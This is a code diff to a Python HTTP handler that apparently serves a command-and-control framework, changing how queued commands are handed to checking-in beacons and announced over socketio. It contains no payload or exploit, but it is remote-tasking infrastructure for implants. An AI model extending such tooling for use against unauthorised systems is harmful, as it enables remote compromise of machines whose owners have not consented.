@@ -5,7 +5,7 @@ from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler
 
 from Modules.global_objects import beacon_list, command_list, logger
-from Modules.beacon_server.socket_manager import socketio
+from Modules.beacon.beacon_server.socket_manager import socketio
 
 
 def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
@@ -41,12 +41,17 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
     commands_to_send = []
     for cmd_id, command in command_list.items():
         if command.beacon_uuid == beacon_id and not command.executed:
+            command.output = "Sent to beacon, waiting for response."
             commands_to_send.append({
                 "command_uuid": cmd_id,
                 "command": command.command,
                 "data": command.command_data
             })
             command.executed = True
+            socketio.emit('command_sent', {
+                'uuid': beacon_id, 'command_id': cmd_id,
+                'command': command.command, 'data': "Sent to beacon."
+            })
 
     response_data = {"commands": commands_to_send} if commands_to_send else {"none": "none"}
     response_body = json.dumps(response_data).encode('utf-8')
